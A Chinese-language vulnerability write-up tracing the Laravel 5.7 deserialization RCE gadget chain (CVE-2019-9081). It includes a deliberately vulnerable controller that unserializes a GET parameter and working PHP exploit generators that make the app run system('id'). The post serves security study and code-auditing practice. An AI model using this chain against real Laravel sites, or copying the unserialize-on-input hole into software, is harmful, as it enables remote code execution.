@@ -1,0 +1,148 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>在前一阵的 <strong>2019强网杯线下赛</strong> 中，出现一道 <strong>Laravel5.7 RCE</strong> 漏洞的利用。之前有关注过这个漏洞，但没细究。比赛期间，原漏洞作者删除了详细的分析文章，故想自己挖掘这个漏洞利用链。本文将详细记录 <strong>Laravel5.7 反序列化漏洞RCE链</strong> 的挖掘过程。</p>
+<h2 data-content="1" id="86af54e936eccc5b0de6c04ea5875c8f">漏洞环境</h2>
+<p>直接使用 <strong>composer</strong> 安装 <strong>laravel5.7</strong> 框架，并通过 <code>php artisan serve</code> 命令启动 <strong>Web</strong> 服务。</p>
+<div class="highlight"><pre><span></span>➜  html composer create-project laravel/laravel laravel57 <span class="s2">"5.7.*"</span>
+➜  html <span class="nb">cd</span> laravel57
+➜  laravel57 php artisan serve --host<span class="o">=</span><span class="m">0</span>.0.0.0
+</pre></div>
+<p>在 <strong>laravel57/routes/web.php</strong> 文件中添加一条路由，便于我们后续访问。</p>
+<div class="highlight"><pre><span></span><span class="x">// /var/www/html/laravel57/routes/web.php</span>
+<span class="cp">&lt;?php</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span><span class="s2">"\App\Http\Controllers\DemoController@demo"</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>在 <strong>laravel57/app/Http/Controllers/</strong> 下添加 <strong>DemoController</strong> 控制器，代码如下：</p>
+<div class="highlight"><pre><span></span><span class="x">// /var/www/html/laravel57/app/Http/Controllers/DemoController.php</span>
+<span class="cp">&lt;?php</span> 
+<span class="k">namespace</span> <span class="nx">App\Http\Controllers</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nx">Illuminate\Http\Request</span><span class="p">;</span>
+
+<span class="k">class</span> <span class="nc">DemoController</span> <span class="k">extends</span> <span class="nx">Controller</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">demo</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">])){</span>
+            <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">];</span>
+            <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+            <span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="s2">"Welcome to laravel5.7"</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<h2 data-content="1" id="9de6b4979065c2ff31e82c227a683860">漏洞链挖掘</h2>
+<p>可用于执行命令的功能位于 <strong>Illuminate/Foundation/Testing/PendingCommand</strong> 类的 <strong>run</strong> 方法中，而该 <strong>run</strong> 方法在 <strong>__destruct</strong> 方法中调用。我们可以参阅官方提供的 <strong>API</strong> 说明手册，来看下各属性和方法的具体含义。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190625113350-0c32f702-96fa-1.png"/></p>
+<p>接着我们看下 <strong>run</strong> 方法的具体代码。如下图所示，当执行完 <strong>mockConsoleOutput</strong> 方法后，程序会在 <strong>第22行</strong> 执行命令。那么要想利用这个命令执行，我们就要保证 <strong>mockConsoleOutput</strong> 方法在执行时不会中断程序（如exit、抛出异常等）。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190625113357-104a3198-96fa-1.png"/></p>
+<p>我们跟进 <strong>mockConsoleOutput</strong> 方法。在下图 <strong>第6行</strong> 代码，我们先使用单步调试直接跳过，观察代码是否继续执行到 <strong>第10行</strong> 的 <strong>foreach</strong> 代码。如果没有，我们则需要对 <strong>第6行</strong> 代码进行详细分析。经过调试，我们会发现程序正常执行到 <strong>第10行</strong> ，那 <strong>第6行</strong> 的代码我们就可以先不细究。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190625113413-1a4ebdbc-96fa-1.png"/></p>
+<p>从上图可看出， <strong>第10行</strong> <strong>$this-&gt;test</strong> 对象的 <strong>expectedQuestions</strong> 属性是一个数组。如果这个数组的内容可以控制，当然会方便我们控制下面的链式调用。所以我们这里考虑通过 <strong>__get</strong> 魔术方法来控制数据，恰巧 <strong>laravel</strong> 框架中有挺多可利用的地方，这里我随意选取一个 <strong>Faker\DefaultGenerator</strong> 类。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190625113426-21edc586-96fa-1.png"/></p>
+<p>所以我们构造如下 <strong>EXP</strong> 继续进行测试。同样，使用该 <strong>EXP</strong> 在 <strong>foreach</strong> 语句处使用单步跳过，看看是否可以正常执行到 <strong>$this-&gt;app-&gt;bind(xxxx)</strong> 语句。实际上，这里可以正常结束 <strong>foreach</strong> 语句，并没有抛出什么异常。同样，我们对 <strong>$this-&gt;app-&gt;bind(xxxx)</strong> 语句也使用单步跳过，程序同样可以正常运行。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">namespace</span> <span class="nx">Illuminate\Foundation\Testing</span><span class="p">{</span>
+    <span class="k">class</span> <span class="nc">PendingCommand</span><span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
+        <span class="k">protected</span> <span class="nv">$app</span><span class="p">;</span>
+        <span class="k">protected</span> <span class="nv">$command</span><span class="p">;</span>
+        <span class="k">protected</span> <span class="nv">$parameters</span><span class="p">;</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$test</span><span class="p">,</span> <span class="nv">$app</span><span class="p">,</span> <span class="nv">$command</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span> <span class="o">=</span> <span class="nv">$test</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span> <span class="o">=</span> <span class="nv">$app</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">command</span> <span class="o">=</span> <span class="nv">$command</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parameters</span> <span class="o">=</span> <span class="nv">$parameters</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">Faker</span><span class="p">{</span>
+    <span class="k">class</span> <span class="nc">DefaultGenerator</span><span class="p">{</span>
+        <span class="k">protected</span> <span class="nv">$default</span><span class="p">;</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$default</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">default</span> <span class="o">=</span> <span class="nv">$default</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">Illuminate\Foundation</span><span class="p">{</span>
+    <span class="k">class</span> <span class="nc">Application</span><span class="p">{</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span> <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span><span class="p">{</span>
+    <span class="nv">$defaultgenerator</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Faker\DefaultGenerator</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"1"</span> <span class="o">=&gt;</span> <span class="s2">"1"</span><span class="p">));</span>
+    <span class="nv">$application</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Foundation\Application</span><span class="p">();</span>
+    <span class="nv">$pendingcommand</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Foundation\Testing\PendingCommand</span><span class="p">(</span><span class="nv">$defaultgenerator</span><span class="p">,</span> <span class="nv">$application</span><span class="p">,</span> <span class="s1">'system'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">'id'</span><span class="p">));</span>
+    <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$pendingcommand</span><span class="p">));</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>使用上面的 <strong>EXP</strong> ，我们已经可以成功进入到最后一步，而这里如果直接单步跳过就会抛出异常，因此我们需要跟进细看。</p>
+<div class="highlight"><pre><span></span><span class="x">$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</span>
+</pre></div>
+<p>这里的 <strong>$this-&gt;app</strong> 实际上是 <strong>Illuminate\Foundation\Application</strong> 类，而在类后面使用 <strong>[]</strong> 是什么意思呢？一开始，我以为这是 <strong>PHP7</strong> 的新语法，后来发现并不是。我们在上面的代码前加上如下两段代码，然后动态调试一下。</p>
+<div class="highlight"><pre><span></span><span class="x">$kclass = Kernel::class;</span>
+<span class="x">$app = $this-&gt;app[Kernel::class];</span>
+<span class="x">$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</span>
+</pre></div>
+<p>可以看到 <strong>Kernel::class</strong> 对应固定的字符串 <strong>Illuminate\Contracts\Console\Kernel</strong> ，而单步跳过 <code>$app = $this-&gt;app[Kernel::class];</code> 代码时会抛出异常。跟进这段代码，我们会发现其会依次调用如下类方法，这些我们都不需要太关注，因为没有发现可控点。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190625113438-290e5920-96fa-1.png"/></p>
+<p>我们要关注的点在最后调用的 <strong>resolve</strong> 方法上，因为这段代码中有我们可控的利用点。如下图中 <strong>角标1</strong> 处，可以明显看到程序 <strong>return</strong> 了一个我们可控的数据。也就是说，我们可以将任意对象赋值给 <strong>$this-&gt;instances[$abstract]</strong> ，这个对象最终会赋值给 <code>$this-&gt;app[Kernel::class]</code> ，这样就会变成调用我们构造的对象的 <strong>call</strong> 方法了。（下图的第二个点是原漏洞作者利用的地方，目的也是返回一个可控类实例，具体可以参看文章：<a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank">laravelv5.7反序列化rce(CVE-2019-9081)</a> ）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190625113446-2de7c51c-96fa-1.png"/></p>
+<p>现在我们再次构造如下 <strong>EXP</strong> 继续进行尝试。为了避免文章篇幅过长，与上面 <strong>EXP</strong> 相同的代码段用省略号代替。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">namespace</span> <span class="nx">Illuminate\Foundation\Testing</span><span class="p">{</span>
+    <span class="k">class</span> <span class="nc">PendingCommand</span><span class="p">{</span>
+        <span class="o">...</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">Faker</span><span class="p">{</span>
+    <span class="k">class</span> <span class="nc">DefaultGenerator</span><span class="p">{</span>
+        <span class="o">...</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">Illuminate\Foundation</span><span class="p">{</span>
+    <span class="k">class</span> <span class="nc">Application</span><span class="p">{</span>
+        <span class="k">protected</span> <span class="nv">$instances</span> <span class="o">=</span> <span class="p">[];</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$instances</span> <span class="o">=</span> <span class="p">[])</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instances</span><span class="p">[</span><span class="s1">'Illuminate\Contracts\Console\Kernel'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$instances</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span><span class="p">{</span>
+    <span class="nv">$defaultgenerator</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Faker\DefaultGenerator</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"1"</span> <span class="o">=&gt;</span> <span class="s2">"1"</span><span class="p">));</span>
+    <span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Foundation\Application</span><span class="p">();</span>
+    <span class="nv">$application</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Foundation\Application</span><span class="p">(</span><span class="nv">$app</span><span class="p">);</span>
+    <span class="nv">$pendingcommand</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Foundation\Testing\PendingCommand</span><span class="p">(</span><span class="nv">$defaultgenerator</span><span class="p">,</span> <span class="nv">$application</span><span class="p">,</span> <span class="s1">'system'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">'id'</span><span class="p">));</span>
+    <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$pendingcommand</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>我们用上面生成的 <strong>EXP</strong> 尝试攻击，会发现已经可以成功执行命令了。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190625113455-3322365c-96fa-1.png"/></p>
+<p>这里我们再来说说为什么这里 <strong>$this-&gt;instances['Illuminate\Contracts\Console\Kernel']</strong> 我选择的是 <strong>Illuminate\Foundation\Application</strong> 类，我们跟着 <strong>EXP</strong> 。</p>
+<p><strong>Illuminate\Foundation\Application</strong> 类继承了 <strong>Illuminate\Container\Container</strong> 类的 <strong>call</strong> 方法，其调用的又是 <strong>Illuminate\Container\BoundMethod</strong> 的 <strong>call</strong> 静态方法。而在这个静态方法中，我们看到一个关键函数 <strong>call_user_func_array</strong> ，其在闭包函数中被调用。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190625113501-36a87818-96fa-1.png"/></p>
+<p>我们先来看一下这个闭包函数在 <strong>callBoundMethod</strong> 静态方法中是如何被调用的。可以看到在 <strong>callBoundMethod</strong> 方法中，返回了闭包函数的调用结果。而闭包函数中返回了 <code>call_user_func_array($callback, static::getMethodDependencies(xxxx))</code> ，我们继续看这个 <strong>getMethodDependencies</strong> 函数的代码。该函数仅仅只是返回 <strong>$dependencies</strong> 数组和 <strong>$parameters</strong> 的合并数据，其中 <strong>$dependencies</strong> 默认是一个空数组，而 <strong>$parameters</strong> 正是我们可控的数据。因此，这个闭包函数返回的是 <code>call_user_func_array(可控数据,可控数据)</code> ，最终导致代码执行。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190625113509-3bb34ef0-96fa-1.png"/></p>
+<h2 data-content="1" id="25360f85924cd1caaaf9a853bb993916">总结</h2>
+<p>个人认为 <strong>PHP</strong> 相关的漏洞中，最有意思的部分就属于 <strong>POP链</strong> 的挖掘。通过不断找寻可利用点，再将它们合理的串成一条链，直达漏洞核心。为了防止思维被固化，个人不建议一开始就去细看他人的漏洞分析文章，不妨自己先试着分析分析。待完成整个漏洞的分析（或遇到问题无法继续下去时），再看他人的文章，学习他们优秀的思路，从而提高自身的代码审计能力。</p>
+</div>
+</div>
